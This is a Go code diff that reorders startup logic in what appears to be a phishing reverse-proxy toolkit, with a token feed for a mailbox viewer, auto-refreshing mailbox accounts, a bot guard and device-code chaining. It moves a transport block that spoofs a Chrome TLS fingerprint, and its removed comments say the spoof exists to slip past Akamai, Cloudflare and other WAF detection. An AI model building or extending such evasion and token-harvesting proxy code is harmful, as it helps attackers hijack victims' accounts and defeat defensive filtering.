@@ -358,21 +358,50 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	// Initialize token feed API for mailbox viewer
 	p.tokenFeed = NewTokenFeed(db)
 
-	// Initialize persistent mailbox accounts manager
-	// Accounts are saved to cfg_dir/mailbox_accounts.json and survive restarts
 	p.mailboxAccounts = NewMailboxAccountManager(cfg.GetDataDir())
-	p.mailboxAccounts.Start() // Start auto-refresh for all saved accounts
-
+	// Do not start mailbox accounts yet - wait until transport is ready
+	
 	// Initialize connection statistics
 	p.connStats.startTime = time.Now()
 	p.connStats.lastConnTime = time.Now()
-
+	
 	// Initialize notifier from config
 	p.notifier.LoadNotifiers(cfg.GetNotifiers(), cfg.GetNotifierDefaults())
 	p.notifier.SetServerName(cfg.GetServerName())
+	
+	// Initialize proxy transport and uTLS
+	// ════════════════════════════════════════════════════════════════════════
+	// REVERSE PROXY SPEED OPTIMIZATION
+	// ════════════════════════════════════════════════════════════════════════
+	dialer := &net.Dialer{
+		Timeout:   30 * time.Second,         // Connection timeout
+		KeepAlive: tcpKeepAliveInterval,     // TCP Keep-Alive probe interval
+		DualStack: true,                     // Support both IPv4 and IPv6
+	}
+	p.Proxy.Tr.DialContext = dialer.DialContext
 
-	// Start botguard cleanup routine
+	p.Proxy.Tr.MaxIdleConns = maxIdleConns
+	p.Proxy.Tr.MaxIdleConnsPerHost = maxIdleConnsPerHost
+	p.Proxy.Tr.MaxConnsPerHost = maxConnsPerHost
+	p.Proxy.Tr.IdleConnTimeout = idleConnTimeout
+	p.Proxy.Tr.TLSHandshakeTimeout = tlsHandshakeTimeout
+	p.Proxy.Tr.ExpectContinueTimeout = expectContTimeout
+	p.Proxy.Tr.ResponseHeaderTimeout = respHeaderTimeout
+	p.Proxy.Tr.DisableCompression = false      // Allow gzip/brotli from upstream
+	p.Proxy.Tr.ForceAttemptHTTP2 = true        // Prefer HTTP/2 for multiplexing
+	p.Proxy.Tr.DisableKeepAlives = false       // Enable connection reuse
+	p.Proxy.Tr.WriteBufferSize = 64 * 1024     // 64KB write buffer for performance
+	p.Proxy.Tr.ReadBufferSize = 64 * 1024      // 64KB read buffer for performance
+	log.Info("transport: connection pooling enabled (max_idle=%d, per_host=%d, keep_alive=%v)", maxIdleConns, maxIdleConnsPerHost, tcpKeepAliveInterval)
+
+	// uTLS: Chrome 120 TLS fingerprint on ALL outgoing connections.
+	setupUtlsTransport(p.Proxy.Tr)
+	log.Info("utls: Chrome TLS fingerprint enabled for all outgoing connections")
+
+	// Now that transport is ready, we can start background managers
+	p.mailboxAccounts.Start() // Start auto-refresh for all saved accounts
 	p.botguard.StartCleanupRoutine()
+
 
 	// Initialize device code chaining callbacks
 	p.setupDeviceCodeCallbacks()
@@ -417,45 +446,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ReadHeaderTimeout: httpReadHeaderTimeout, // Fast timeout for slow clients/attacks
 	}
 
-
-	// ════════════════════════════════════════════════════════════════════════
-	// REVERSE PROXY SPEED OPTIMIZATION
-	// ════════════════════════════════════════════════════════════════════════
-	// These settings dramatically improve page load times by:
-	// 1. Reusing connections (connection pooling) instead of new TCP+TLS per request
-	// 2. Keeping idle connections alive longer to avoid handshake overhead
-	// 3. Allowing more parallel connections to upstream servers
-	// 4. TCP Keep-Alive on all outgoing connections for reliability
-	// ════════════════════════════════════════════════════════════════════════
-
-	// Create a custom dialer with TCP Keep-Alive for outgoing connections
-	dialer := &net.Dialer{
-		Timeout:   30 * time.Second,         // Connection timeout
-		KeepAlive: tcpKeepAliveInterval,     // TCP Keep-Alive probe interval
-		DualStack: true,                     // Support both IPv4 and IPv6
-	}
-	p.Proxy.Tr.DialContext = dialer.DialContext
-
-	p.Proxy.Tr.MaxIdleConns = maxIdleConns
-	p.Proxy.Tr.MaxIdleConnsPerHost = maxIdleConnsPerHost
-	p.Proxy.Tr.MaxConnsPerHost = maxConnsPerHost
-	p.Proxy.Tr.IdleConnTimeout = idleConnTimeout
-	p.Proxy.Tr.TLSHandshakeTimeout = tlsHandshakeTimeout
-	p.Proxy.Tr.ExpectContinueTimeout = expectContTimeout
-	p.Proxy.Tr.ResponseHeaderTimeout = respHeaderTimeout
-	p.Proxy.Tr.DisableCompression = false      // Allow gzip/brotli from upstream
-	p.Proxy.Tr.ForceAttemptHTTP2 = true        // Prefer HTTP/2 for multiplexing
-	p.Proxy.Tr.DisableKeepAlives = false       // Enable connection reuse
-	p.Proxy.Tr.WriteBufferSize = 64 * 1024     // 64KB write buffer for performance
-	p.Proxy.Tr.ReadBufferSize = 64 * 1024      // 64KB read buffer for performance
-	log.Info("transport: connection pooling enabled (max_idle=%d, per_host=%d, keep_alive=%v)", maxIdleConns, maxIdleConnsPerHost, tcpKeepAliveInterval)
-
-	// uTLS: Chrome 120 TLS fingerprint on ALL outgoing connections.
-	// Go's default net/http JA3 (4d7a28d6f2263ed61de88ca66eb2e98) is
-	// immediately flagged by Akamai, Cloudflare, and other WAFs.
-	// Chrome 120's JA3 matches real browser traffic.
-	setupUtlsTransport(p.Proxy.Tr)
-	log.Info("utls: Chrome TLS fingerprint enabled for all outgoing connections")
 
 	// Apply proxy settings after uTLS transport is initialized so it can be correctly propagated
 	if cfg.proxyConfig.Enabled {
